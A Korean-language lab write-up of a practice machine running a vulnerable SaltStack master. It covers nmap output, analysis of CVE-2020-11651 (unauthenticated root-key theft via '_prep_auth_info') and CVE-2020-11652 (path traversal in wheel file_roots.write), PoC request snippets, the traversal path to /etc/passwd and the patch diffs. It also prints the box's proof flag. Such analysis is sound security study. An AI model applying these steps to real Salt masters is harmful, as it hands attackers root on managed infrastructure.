---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/salt
  - tech/web/auth-bypass
  - tech/lin/passwd-write
  - tech/cred/crack
type: machine
platform: pg
os: linux
ip: 192.168.189.62
ports: [22, 53, 80, 4505, 4506, 8000]
services: [domain, http, ssh, zmtp]
cves: [CVE-2020-11651, CVE-2020-11652]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---
> [!info] PG Practice — Fundamental · 플래그 1/1
> **타겟** 192.168.189.62 · **OS** CentOS/RHEL 7 계열 (호스트명 `twiggy`) · **난이도** Fundamental
> **경로 요약** nmap이 4505/4506 ZeroMQ ZMTP를 보여줌 → 그 위에 올라간 salt-master 식별 → **CVE-2020-11651**(인증 없이 root key 탈취) → **CVE-2020-11652**(`wheel file_roots.write` 경로 트래버설) → `/etc/passwd`에 UID 0 계정 추가 → SSH로 root 로그인
> **플래그** `/root/proof.txt` = `3fd4954f15b0824c66637cf374e5afd0`
> **소요 시간** nmap 09:39 → root 셸 13:49 (약 4시간). 그중 대부분은 잘못된 검색어와 동작하지 않는 RCE 옵션에 썼다 (6장)

## 0. 이 박스에서 배우는 것

- **`zmtp`는 서비스가 아니라 전송 계층이다.** nmap이 알려주는 이름이 곧 공격 대상이 아니다 — ZeroMQ 위에 무엇이 올라가 있는지를 포트 번호로 역추적하는 습관
- **인증 이전에 노출된 디스패처 = 인증 우회.** salt-master의 `_handle_clear()`가 `cmd` 문자열을 그대로 메서드 이름으로 썼기 때문에, 인증을 담당하는 내부 헬퍼 자체를 호출할 수 있었다. 이 취약점 클래스(내부 메서드가 RPC 이름공간에 새어 나옴)는 언어·프레임워크를 가리지 않는다
- **root key란 무엇인가** — salt에서 "인증"이 어떻게 표현되고, 그 키 하나가 왜 마스터 전체를 지배하는가
- **`../` 트래버설로 임의 파일 쓰기 → `/etc/passwd`에 UID 0 추가** — 셸을 못 잡아도 root가 되는 정석 경로. `openssl passwd`로 crypt 해시를 만들어 두 번째 root 계정을 심는다
- **"작업이 예약되었다"는 "명령이 실행되었다"가 아니다** — 이 박스의 RCE 옵션이 정확히 이 함정이었다
- **PoC의 출력을 읽는 법** — 공개 익스플로잇이 찍는 버전 문자열이 타겟이 아니라 공격자 자신의 것일 수 있다 (6장 ③)

**시험 출제 가능성**

| 요소 | 시험 출제 가능성 | 이유 |
|---|---|---|
| SaltStack 자체 | 낮음 | 2020년 CVE이고 특정 제품이다. 같은 CVE가 시험에 나올 확률은 낮다 |
| "낯선 포트 → 어떤 제품인지 역추적" | 매우 높음 | 시험은 정확히 이걸 요구한다. `4505/4506`이 salt, `8000`이 salt-api라는 것을 포트 번호로 좁히는 훈련이 본질이다 |
| `/etc/passwd`에 UID 0 계정 추가 | 매우 높음 | 임의 파일 쓰기 원시(primitive)를 얻었을 때 리눅스의 1순위 승격 경로다. [[Access]] · [[Flu]] · [[Clue]]에서도 동일 |
| 공개 PoC를 읽고 고쳐 쓰기 | 매우 높음 | 시험에서 만나는 PoC는 대개 그대로는 안 돈다. 이 박스의 PoC도 `--exec`가 먹지 않았고 `--run-checks`는 아예 깨져 있다 |

변형은 이런 모습이다 — salt 대신 Redis(6379) `CONFIG SET dir`, Docker API(2375), Jenkins(8080) script console, Consul(8500) → **"인증 없이 관리 평면에 닿는다"가 공통 구조**다.

---

## 1. 정찰

### 1-1. Nmap 원문

```bash
┌──(kali㉿kali)-[~/PG/Twiggy]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.189.62
```

`~/PG/Twiggy/nmap.log` 원문:

```
# Nmap 7.98 scan initiated Thu Jun 11 09:39:57 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.189.62
Nmap scan report for 192.168.189.62
Host is up (0.066s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Home | Mezzanine
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   65.86 ms 192.168.45.1
2   65.70 ms 192.168.45.254
3   66.10 ms 192.168.251.1
4   66.34 ms 192.168.189.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 11 09:40:51 2026 -- 1 IP address (1 host up) scanned in 53.45 seconds
```

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | **이 박스는 `-p-` 없이는 못 푼다.** 4505/4506은 nmap 기본 1000포트 목록 밖이다. 기본 스캔이면 22/53/80만 보이고 Mezzanine CMS를 파느라 시간을 통째로 날린다 |
| `-sCV` | 기본 NSE 스크립트 + 버전 탐지 | 빼면 `4505/tcp open unknown`으로만 나온다. `zmtp` 이름은 버전 탐지가 만들어낸 유일한 단서였다 |
| `-Pn` | 호스트 디스커버리 생략 | PG 랩은 ICMP를 막는 경우가 흔하다. 빼면 "Host seems down"으로 스캔 자체가 중단된다 |
| `-A` | OS 판정 + traceroute + `--script=default` | OS 추정과 traceroute가 붙는다. 이 박스에서는 OS 판정이 "JUST GUESSING"이라 별 도움이 안 됐다 (아래 참조) |
| `--min-rate 5000` | 초당 최소 5000패킷 | 없으면 65535포트 전수가 수십 분. 여기서는 53초에 끝났다. 단 필터링 구간에서 패킷 손실로 포트를 놓칠 수 있다 — 결과가 이상하면 rate를 낮춰 재스캔 |
| `-oN nmap.log` | 사람이 읽는 형식으로 저장 | 저장을 안 하면 나중에 재확인하려고 다시 스캔하게 된다. 시험에서는 그 시간이 곧 점수다 |

**`Not shown: 65529 filtered tcp ports (no-response)` 를 읽어라**
`closed`(RST 반환)가 아니라 `filtered`(무응답)다. 방화벽이 앞단에 있다는 뜻이고, 이것이 6장 ②의 리버스셸 실패와 직결된다. 아웃바운드도 같은 정책일 가능성을 처음부터 의심했어야 했다.

### 1-2. OS 판정 — nmap을 믿지 말고 `/etc/passwd`로 확정한다

nmap의 `-A`는 `Linux 3.10 - 4.11 (97%)`, `MikroTik RouterOS 7.2 - 7.5 (91%)`까지 늘어놓고 `No exact OS matches`로 끝났다. 쓸 수 없는 정보다. 이유는 스캔 결과 그대로 적혀 있다 — `we could not find at least 1 open and 1 closed port`. 전 포트가 `filtered`라 TCP/IP 스택 지문의 기준선이 없다.

확정 근거는 나중에 읽어낸 `/etc/passwd`(3장)에서 나왔다:

| 근거 | 판정 |
|---|---|
| `OpenSSH 7.4 (protocol 2.0)` | RHEL/CentOS **7** 계열의 기본 OpenSSH 버전 |
| `/sbin/nologin` (Debian은 `/usr/sbin/nologin`) | RHEL 계열 |
| `polkitd:x:999:998` · `chrony:x:998:996` · `nginx:x:996:994` | 시스템 계정 UID가 999부터 내려가며 할당 — RHEL 7의 `useradd -r` 기본 동작 |
| `named:x:25:25:Named:/var/named` | `/var/named`는 RHEL 계열 bind 경로 (Debian은 `/var/cache/bind`) |
| 셸 프롬프트 `[root@twiggy ~]#` | RHEL 계열 기본 `PS1` |

**이것이 "버전 판정은 독립 근거 2개" 규율의 적용**이다([[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]]). nmap 한 줄로 OS를 단정했다면 커널 익스플로잇 같은 엉뚱한 경로로 샜을 것이다.

### 1-3. 서비스 식별 — 포트 번호가 제품을 특정한다

nmap이 준 이름은 `zmtp`뿐이다. ZMTP는 ZeroMQ의 와이어 프로토콜이지 제품이 아니다. nginx가 HTTP라는 것만 알려주고 어떤 앱인지는 안 알려주는 것과 같다.

여기서 결정적인 것은 **포트 번호 쌍**이다:

| 포트 | salt에서의 역할 | 소켓 패턴 |
|---|---|---|
| **4505** | Publish 인터페이스. 마스터가 미니언에게 작업을 뿌리는 채널 | ZeroMQ `PUB` (마스터) ↔ `SUB` (미니언들) |
| **4506** | Request 서버. 미니언이 마스터에게 요청/결과를 보내는 채널. **공격 대상은 여기다** | ZeroMQ `REP` (마스터) ↔ `REQ` (미니언) |
| **8000** | **salt-api** (`rest_cherrypy`)의 기본 포트(`app.py`의 `self.apiopts.get('port', 8000)`). 무인증 `GET /`가 `{"return": "Welcome", "clients": [...]}` JSON을 돌려주는데, nmap의 `Site doesn't have a title (application/json)`과 정확히 일치한다 · `[가정]` — 랩 반납 후라 타겟에서 직접 확인하지 못했다 |

**낯선 포트를 만나면 이름이 아니라 번호로 검색하라**
`zmtp exploit`으로 검색하면 libzmq 자체의 CVE(CVE-2014-9721 등)로 끌려간다 — 실제로 그렇게 됐다(6장 ①).
옳은 검색어는 **`4505 4506 port`** 또는 **`zeromq 4505 4506`**다. 포트 번호 쌍은 제품의 지문이다.

같은 계열로 외워둘 것:

| 포트 | 제품 | 첫 수 |
|---|---|---|
| 4505/4506 | **SaltStack salt-master** | CVE-2020-11651 체크 |
| 8000 (json) | salt-api / Django dev server | `/run`, `/login` 프로브 |
| 5985/5986 | WinRM | `evil-winrm` |
| 6379 | Redis | `redis-cli -h` → `INFO`, `CONFIG GET dir` |
| 2375/2376 | Docker API | `docker -H tcp://` → 컨테이너 탈출 |
| 11211 | memcached | `stats` |
| 9200 | Elasticsearch | `/_cat/indices` |

### 1-4. 검색 → 취약점 확정

```
Google: "Zeromq ZMTP 2.0 exploit"
```

![[Pasted image 20260611125128.png]]

상위 3건은 전부 libzmq 라이브러리 자체의 문제(HackerOne #477073, CVE-2014-9721, zeromq/libzmq issue #3351)였다. 4번째에서야 Exploit-DB **"Saltstack 3000.1 - Remote Code Execution"**이 나왔다.

![[Pasted image 20260611125204.png]]

EDB-ID **48421**, 작성자 Jasper Lievisse Adriaanse, 2020-05-05. 헤더에 영향 범위가 적혀 있다:

```
# Exploit Title: Saltstack 3000.1 - Remote Code Execution
# Date: 2020-05-04
# Exploit Author: Jasper Lievisse Adriaanse
# Vendor Homepage: https://www.saltstack.com/
# Version: < 3000.2, < 2019.2.4, 2017.*, 2018.*
# Tested on: Debian 10 with Salt 2019.2.0
# CVE : CVE-2020-11651 and CVE-2020-11652
# Discription: Saltstack authentication bypass/remote code execution
```

**EDB 헤더는 익스플로잇 작성자의 주장이지 벤더 어드바이저리가 아니다**
패치 버전을 확정하려면 SaltStack/VMware 공지를 직접 봐야 한다. 이 노트에서는 설치된 salt 패키지 소스 자체를 1차 근거로 썼다(2장 2-5).

PoC 저장소를 받는다:

```bash
git clone https://github.com/jasperla/CVE-2020-11651-poc.git
```

![[Pasted image 20260611125243.png]]

받은 시점의 HEAD:

```
eca6ba2d0845ed99c43b65295e2d42a02e6bd4f8  Fri Jul 10 11:30:09 2020 +0200
    Rework version / vulnerability detection
```

PoC는 `salt` 파이썬 패키지를 클라이언트 라이브러리로 쓴다. 즉 공격자 쪽에도 salt가 설치돼 있어야 한다:

```bash
pip3 install salt        # kali: ~/.local/lib/python3.13/site-packages/salt (3008.0)
```

---

## 2. 취약점 분석

### 2-1. 배경 — SaltStack의 구조와 "인증"의 정체

SaltStack은 마스터/미니언 구성관리 시스템이다. 마스터는 두 개의 ZeroMQ 소켓을 연다.

```
                       ┌──────────────── salt-master (root 권한) ────────────────┐
                       │                                                         │
  minion ──SUB◄────────┤ 4505  PUB   : 작업 명령을 브로드캐스트                  │
                       │                                                         │
  minion ──REQ────────►┤ 4506  REP   : 인증 · 작업 결과 회수 · 파일 서빙         │  ← 공격면
                       │             MWorker._handle_clear() / _handle_aes()     │
                       └─────────────────────────────────────────────────────────┘
```

4506으로 오는 요청은 msgpack으로 직렬화된 딕셔너리 하나이고, 단일 ZMTP 프레임으로 나간다. 최상위 구조는 클라이언트 코드(`salt/transport/zeromq.py`)가 그대로 보여준다:

```python
    def _package_load(self, load):
        return {
            'enc': self.crypt,     # 'clear' 또는 'aes'
            'load': load,          # 실제 요청 본문
        }
```

`load` 안에는 `cmd`(호출할 메서드 이름)가 필수이고 나머지는 그 메서드의 인자다. `MWorker._handle_payload()`의 docstring이 실제 평문 페이로드를 통째로 예시로 담고 있다 — `salt myminion test.ping` 한 번이 만드는 것:

```python
        {'enc': 'clear',
         'load': {'arg': [],
                  'cmd': 'publish',
                  'fun': 'test.ping',
                  'jid': '',
                  'key': 'alsdkjfa.,maljf-==adflkjadflkjalkjadfadflkajdflkj',
                  'kwargs': {'show_jid': False, 'show_timeout': False},
                  'ret': '',
                  'tgt': 'myminion',
                  'tgt_type': 'glob',
                  'user': 'root'}}
```

`key` 필드를 보라 — 저기가 root key가 들어가는 자리다. 즉 우리가 4장에서 하는 일은 이 예시와 완전히 같은 형태의 요청을 보내는 것이고, 유일한 차이는 `key` 값을 훔쳐서 채운다는 것뿐이다.

서버는 `enc` 값만 보고 핸들러를 가른다:

```python
        key = payload['enc']
        load = payload['load']
        ret = {'aes': self._handle_aes,
               'clear': self._handle_clear}[key](load)
```

| `enc` | 핸들러 | 의미 |
|---|---|---|
| `'aes'` | `MWorker._handle_aes()` → `AESFuncs` | 미니언 키로 암호화됨 = 이미 인증된 미니언 |
| `'clear'` | `MWorker._handle_clear()` → `ClearFuncs` | 평문 = 아직 키가 없는 상대. 최초 키 교환(`_auth`)이 여기로 온다 |

`ClearFuncs`가 존재하는 이유는 단 하나 — 미니언이 처음 붙을 때는 아직 공유 키가 없기 때문이다. 그래서 salt는 "인증 없이 처리해도 안전한 함수들"을 `ClearFuncs`에 모아두었다. 클래스 docstring 원문이 그 의도를 그대로 말한다:

```python
class ClearFuncs(TransportMethods):
    """
    Set up functions that are safe to execute when commands sent to the master
    without encryption and authentication
    """
```

이 설계에서 유일하게 중요한 질문은 "무엇이 안전한 함수인가를 누가 정하는가"다. 취약점은 정확히 거기서 났다.

### 2-2. CVE-2020-11651 — 밑줄 하나가 방어를 통과했다

`load` 안의 `cmd` 필드가 호출할 함수 이름이다. 패치 이전의 `_handle_clear()` 원문(v3000.1 `salt/master.py:1080`):

```python
    def _handle_clear(self, load):
        log.trace('Clear payload received with command %s', load['cmd'])
        cmd = load['cmd']
        if cmd.startswith('__'):        # ★ 유일한 방어 — 거부 목록(denylist)
            return False
        if self.opts['master_stats']:
            start = time.time()
            self.stats[cmd]['runs'] += 1
        ret = getattr(self.clear_funcs, cmd)(load), {'fun': 'send_clear'}
```

**방어가 아예 없었던 게 아니다. 있었는데 틀린 종류였다.**

`cmd.startswith('__')` — 밑줄 **두 개**로 시작하는 이름만 막는다. 아마도 파이썬의 던더 메서드(`__init__`, `__class__`, `__reduce__` 같은 것)를 막을 의도였을 것이다. 그런데 `_prep_auth_info`는 **밑줄이 하나**다. 그대로 통과한다.

그리고 `getattr(obj, "아무거나")`는 public/private를 구분하지 않는다 — 파이썬의 `_` 접두사는 관례일 뿐 접근 제어가 아니다. 그래서 밑줄 하나로 시작하는 `ClearFuncs`의 모든 내부 헬퍼가 인증 없이 호출 가능했다. 화이트리스트 도입 시 실제로 제외된 것들이 그 목록이다: `_prep_auth_info` · `_send_pub` · `_prep_pub` · `_prep_jid` · `_send_ssh_pub` · `ssh_client`.

**거부 목록(denylist)이 실패하는 이유가 한 줄에 있다**
`startswith('__')`는 작성자가 상상한 위험한 이름의 집합을 막는다. 상상 밖의 것은 못 막는다.
허용 목록(allowlist)은 반대로 작성자가 안전하다고 확인한 것만 통과시킨다. 상상 밖의 것은 자동으로 막힌다.
**"막을 것을 세는 코드"를 보면 의심하고, "통과시킬 것을 세는 코드"를 찾아라.** 이 CVE는 그 차이가 pre-auth 원격 root로 이어진 사례다.

가장 값나가는 표적이 인증 준비용 내부 헬퍼 `_prep_auth_info()`였다. v3000.1 `salt/master.py:2153` 원문(패치 이후에도 함수 본문은 그대로다):

```python
# v3000.1  salt/master.py:2153
    def _prep_auth_info(self, clear_load):
        sensitive_load_keys = []
        key = None
        if 'token' in clear_load:
            auth_type = 'token'
            err_name = 'TokenAuthenticationError'
            sensitive_load_keys = ['token']
        elif 'eauth' in clear_load:
            auth_type = 'eauth'
            err_name = 'EauthAuthenticationError'
            sensitive_load_keys = ['username', 'password']
        else:
            auth_type = 'user'
            err_name = 'UserAuthenticationError'
            key = self.key                      # ★ 마스터의 키 딕셔너리 전체

        return auth_type, err_name, key, sensitive_load_keys
```

현행 3008.0(`salt/master.py:3998`)에도 로직이 그대로 있다. 인용부호 스타일만 바뀌었다 — 패치는 이 함수를 건드리지 않았기 때문이다.

**데이터 흐름을 따라가면 이렇게 된다:**

1. 공격자가 `{'cmd': '_prep_auth_info'}`를 4506으로 보낸다. `load`에 `token`도 `eauth`도 없다.
2. `else` 분기 → `key = self.key`. `self.key`는 마스터의 키 딕셔너리이며 `'root'` 항목에 마스터 로컬 인증용 root key가 들어 있다(디스크상으로는 `/var/cache/salt/master/.root_key`).
3. 함수는 4-튜플 `(auth_type, err_name, key, sensitive_load_keys)`를 리턴한다.
4. `_handle_clear()`는 이 리턴값을 그대로 직렬화해 응답으로 돌려준다. 인증 실패도, 예외도 없다 — 애초에 실패할 코드 경로가 없다.

PoC가 하는 일은 정확히 이 4줄이다:

```python
# exploit.py:56
rets = channel.send({'cmd': '_prep_auth_info'}, timeout=3)
...
root_key = rets[2]['root']       # 튜플의 인덱스 2 = key, 그 안의 'root'
```

`rets[2]`가 튜플의 세 번째 원소 = `key`이고, `['root']`로 root key를 뽑는다. 위 함수 시그니처와 인덱스가 정확히 맞는다.

**이 취약점 클래스의 이름을 붙여두라 — "내부 메서드가 RPC 이름공간에 새어 나옴"**
원인은 salt에 있는 게 아니라 "문자열을 받아 함수를 고르는 디스패처가 허용 목록을 안 쓴 것"에 있다.
같은 구조를 다른 곳에서도 만난다:
- PHP `call_user_func($_GET['fn'], ...)` → 임의 함수 호출
- Java 리플렉션 기반 라우터에서 `getDeclaredMethod()`
- Python `getattr(handler, request['action'])`
- Ruby on Rails `send(params[:method])`

**점검 질문 하나로 요약된다: "호출 가능한 이름이 허용 목록(allowlist)으로 제한돼 있는가, 아니면 거부 목록(denylist)이거나 아예 없는가?"**

### 2-3. root key가 왜 마스터 전체를 지배하는가

root key는 salt 마스터가 자기 자신에 대한 로컬 관리 호출을 인증하는 데 쓰는 값이다. 마스터 호스트에서 root 사용자가 `salt-run`·`salt-wheel`을 실행할 때 쓰이는 그 키다.

`ClearFuncs`가 정상적으로 노출하는 함수 중 `runner`와 `wheel`이 있고, 둘 다 `_prep_auth_info()`가 돌려준 `key`로 인증을 검사한다:

```python
# salt/master.py:3724
    def wheel(self, clear_load):
        """
        Send a master control function back to the wheel system
        """
        # All wheel ops pass through eauth
        auth_type, err_name, key, sensitive_load_keys = self._prep_auth_info(clear_load)

        # Authenticate
        auth_check = self.loadauth.check_authentication(clear_load, auth_type, key=key)
        error = auth_check.get("error")

        if error:
            # Authentication error occurred: do not continue.
            return {"error": error}
```

즉 **검사에 쓰이는 비밀을 검사 대상에게 그냥 알려준 것**이다. 금고 문 앞에 비밀번호를 붙여둔 격이다. 이 키를 손에 넣으면 `wheel`·`runner` 호출이 전부 정당한 요청으로 통과한다.

그리고 salt-master는 사실상 root로 돈다. 정확히 말하면 "코드에 root가 박혀 있다"가 아니라 **"패키지가 root로 기동하므로 결과적으로 root"**다:

- 배포 패키지의 `pkg/salt-master.service`에 **`User=` 지시자가 없다** → systemd 기본값인 root로 실행된다
- 기본 설정 파일 `conf/master`의 해당 항목은 **주석 처리된 `#user: root`**
- 코드상 기본값은 "프로세스를 띄운 사용자"(`salt.utils.user.get_user()`)

뒷받침하는 소스 주석이 있다 — `salt/daemons/masterapi.py`의 `access_keys()`:

```python
def access_keys(opts):
    '''
    A key needs to be placed in the filesystem with permissions 0400 so
    clients are required to run as root.
    '''
```

그래서 `wheel`이 파일에 쓰면 **root 권한의 쓰기**다 — 이 사실이 4장 전체의 근거다. 이 박스에서는 `/etc/passwd` 쓰기가 실제로 성공한 것이 경험적 증거다.

같은 함수가 root key의 정체도 알려준다. `self.key`는 `access_keys(self.opts)`가 만든 `{사용자명: 키문자열}` 딕셔너리이고, 각 키는 `/var/cache/salt/master/.<사용자>_key` 파일 내용이다. `['root']`가 곧 **`/var/cache/salt/master/.root_key`**다.

### 2-4. CVE-2020-11652 — `wheel file_roots.write`의 경로 정규화 부재

root key를 얻었으니 이제 `wheel`을 부를 수 있다. `file_roots` wheel 모듈은 salt의 파일 서버 루트(기본 `/srv/salt`) 안에서 파일을 읽고 쓰라고 만든 것이다. 문제는 주어진 경로를 루트에 단순히 이어붙였을 뿐, 루트 밖으로 나가는지 검사하지 않았다는 것이다.

취약 버전(v3000.1)의 `salt/wheel/file_roots.py` 원문 — **읽기와 쓰기의 방어 수준이 다르다**:

```python
def find(path, saltenv='base'):          # read() 가 내부적으로 호출한다
    ...
    for root in __opts__['file_roots'][saltenv]:
        full = os.path.join(root, path)  # ★ 검사가 전혀 없다
        if os.path.isfile(full):
            ...

def write(data, path, saltenv='base', index=0):
    ...
    if os.path.isabs(path):
        return ('The path passed in {0} is not relative to the environment '
                '{1}').format(path, saltenv)   # ★ 절대경로만 막는다
    dest = os.path.join(__opts__['file_roots'][saltenv][index], path)
    dest_dir = os.path.dirname(dest)
    if not os.path.isdir(dest_dir):
        os.makedirs(dest_dir)                  # ★ 없는 상위 디렉터리를 만들어준다
    with salt.utils.files.fopen(dest, 'w+') as fp_:
        fp_.write(salt.utils.stringutils.to_str(data))
```

**세 가지를 짚어야 한다:**

**① 읽기에 절대경로가 통한 이유는 `os.path.join`의 동작이다.** 파이썬의 `os.path.join('/srv/salt', '/etc/passwd')`는 `/srv/salt/etc/passwd`가 아니라 `/etc/passwd`를 돌려준다 — 두 번째 인자가 절대경로면 앞의 것을 통째로 버린다. `find()`에는 `isabs` 검사조차 없으므로 `-r /etc/passwd`가 그대로 성공했다(3-2). 트래버설조차 필요 없었다.

**② 쓰기의 `isabs` 검사는 서버 측에도 있다.** PoC의 `os.path.isabs` 검사(2-6 ③)는 서버 동작을 미리 흉내낸 것이지 PoC 고유의 제약이 아니다. 그래서 `../`가 유일한 우회 수단이 된다.

**③ `os.makedirs(dest_dir)`가 없는 디렉터리를 만들어준다.** 이것이 4장의 경로 선택을 바꾼다 — `/root/.ssh/`가 없어도 `authorized_keys`를 심을 수 있었다는 뜻이다.

PoC의 쓰기 요청은 이 형태다:

```python
# exploit.py:223
    msg = {
        'key': root_key,              # 2-2에서 훔친 값
        'cmd': 'wheel',
        'fun': 'file_roots.write',
        'saltenv': 'base',
        'data': payload,              # 파일 내용 (bytes)
        'path': dest,                 # ★ 여기에 ../ 를 넣는다
    }
```

서버가 되돌려준 문자열이 취약점을 그대로 자백한다:

```
[ ] Wrote data to file /srv/salt/../../../../../etc/passwd
```

`/srv/salt` + `/` + `../../../../../etc/passwd`를 문자열로 이어붙인 그대로 열었다. 커널이 경로를 해석하면 `/srv/salt/../..` = `/`이고, 남는 `../`는 `/`에서 아무 효과가 없으므로 최종 경로는 `/etc/passwd`다.

**`../`를 몇 개 넣어야 하는가 — 넉넉히 넣어도 안전한 이유**
`/srv/salt`는 루트에서 2단계이므로 `../..` 두 개면 충분하다. 그런데 PoC 사용례도 이 박스의 실제 명령도 **5개**를 넣었다.
**루트 디렉터리에서 `..`는 자기 자신이다**(`/.. == /`). 그래서 필요한 것보다 많이 넣어도 손해가 없고, 대상 앱의 기준 디렉터리 깊이를 모를 때는 넉넉히 넣는 것이 정답이다. 반대로 모자라면 조용히 엉뚱한 곳에 쓴다.

패치(커밋 `cce7abad`, 2020-04-13, Daniel A. Wozniak)는 경로를 다루는 네 지점 전부에 검증 호출을 끼워 넣는 것이었다. 커밋 메시지 원문:

```
Fix CVE-2020-11652

Sanitize paths in ClearFuncs methods provided by salt-master. This
ensures we do not allow access to un-intended files and directories.
```

| 수정된 파일 | 무엇을 막았나 |
|---|---|
| `salt/wheel/file_roots.py` `find()` | 임의 파일 **읽기** (`read()`가 이걸 부른다) |
| `salt/wheel/file_roots.py` `write()` | 임의 파일 **쓰기** ← 이 박스가 쓴 것 |
| `salt/tokens/localfs.py` `get_token()` | 토큰 경로를 통한 임의 파일 읽기 (덜 알려진 두 번째 읽기 원시) |
| `salt/wheel/config.py` `update_config()` | 임의 위치에 `.conf` 파일 쓰기 |

`file_roots.py`의 diff는 두 줄짜리다:

```diff
     for root in __opts__['file_roots'][saltenv]:
         full = os.path.join(root, path)
+        if not salt.utils.verify.clean_path(root, full):
+            continue
         if os.path.isfile(full):
```
```diff
-    dest = os.path.join(__opts__['file_roots'][saltenv][index], path)
+    root = __opts__['file_roots'][saltenv][index]
+    dest = os.path.join(root, path)
+    if not salt.utils.verify.clean_path(root, dest, subdir=True):
+        return 'Invalid path: {}'.format(path)
```

**`clean_path()`는 이 패치로 새로 만든 함수가 아니다 — 이미 있었는데 부르지 않았던 것이다**
취약 버전 v3000.1의 `salt/utils/verify.py`에도 `clean_path()`가 존재한다. 패치가 한 일은 두 가지다:
1. 호출을 추가한 것 (위 diff)
2. 함수 자체에 `realpath` 해석을 추가한 것 — 심볼릭 링크로 루트 밖을 가리키는 우회를 막기 위해

**"검증 함수가 코드베이스에 있다"와 "위험한 경로에서 실제로 호출된다"는 완전히 다른 문제다.** 코드 리뷰에서 자주 놓치는 지점이고, 이 CVE의 실체가 정확히 그것이었다.

현재(3008.0)의 `clean_path()` 전문. 핵심은 `os.path.normpath()`로 정규화한 뒤 루트 안에 있는지 비교하는 것이다:

```python
# salt/utils/verify.py:533
def clean_path(root, path, subdir=False, realpath=True):
    """
    Accepts the root the path needs to be under and verifies that the path is
    under said root. Pass in subdir=True if the path can result in a
    subdirectory of the root instead of having to reside directly in the root.
    Pass realpath=False if filesystem links should not be resolved.
    """
    if not os.path.isabs(root):
        root = os.path.join(os.getcwd(), root)
    normroot = os.path.normpath(root)
    if not os.path.isabs(path):
        path = os.path.join(normroot, path)
    normpath = os.path.normpath(path)
    if realpath:
        normroot = _realpath(normroot)
        normpath = _realpath(normpath)
    if subdir:
        if os.path.commonpath([normpath, normroot]) == normroot:
            return normpath
    else:
        if os.path.dirname(normpath) == normroot:
            return normpath
    return ""
```

읽을 점 두 가지:
- `os.path.normpath()`가 `..`를 먼저 접는다. 이어붙이기 전에 검사했다면 `../` 문자열만 걸러도 우회 가능했겠지만, 접은 뒤 비교하므로 인코딩 변형(`....//`, `%2e%2e`)이 통하지 않는다.
- `realpath=True`가 기본이라 심볼릭 링크까지 해소한 뒤 비교한다. 링크를 심어 루트 밖을 가리키게 만드는 우회도 막힌다.

### 2-5. 진짜 패치 — 허용 목록(allowlist) 도입

CVE-2020-11651의 근본 수정(커밋 `a67d76b1`, 2020-04-13, Daniel A. Wozniak)은 `_prep_auth_info`를 없애는 게 아니었다. 그 함수는 지금도 그대로 있고 `runner`·`wheel`·`publish`가 여전히 호출한다. 고친 것은 **전송 계층이 어떤 이름을 부를 수 있는가**다. 커밋 메시지 원문:

```
Fix CVE-2020-11651

Resolve issue which allows access to un-intended methods in the
ClearFuncs class of the salt-master process
```

디스패처의 diff가 전환의 전부다:

```diff
         cmd = load['cmd']
-        if cmd.startswith('__'):
-            return False
+        method = self.clear_funcs.get_method(cmd)
+        if not method:
+            return {}, {'fun': 'send_clear'}
         if self.opts['master_stats']:
             start = time.time()
             self.stats[cmd]['runs'] += 1
-        ret = getattr(self.clear_funcs, cmd)(load), {'fun': 'send_clear'}
+        ret = method(load), {'fun': 'send_clear'}
```

`AESFuncs`(`enc: 'aes'` 경로)에도 같은 수정이 동시에 들어갔다. 그쪽도 `startswith('__')` 거부 목록뿐이었고, 화이트리스트 28개로 교체됐다. 즉 패치는 두 디스패처를 함께 고친 것이다.

아래는 현재(3008.0) 설치본에서 확인한 결과 코드다.

```python
# salt/master.py:2097
class TransportMethods:
    """
    Expose methods to the transport layer, methods with their names found in
    the class attribute 'expose_methods' will be exposed to the transport layer
    via 'get_method'.
    """

    expose_methods = ()

    def get_method(self, name):
        """
        Get a method which should be exposed to the transport layer
        """
        if name in self.expose_methods:
            try:
                return getattr(self, name)
            except AttributeError:
                log.error("Requested method not exposed: %s", name)
        else:
            log.error("Requested method not exposed: %s", name)
```

그리고 `ClearFuncs`가 무엇을 노출하는지 명시된다:

```python
# salt/master.py:3614
class ClearFuncs(TransportMethods):
    """
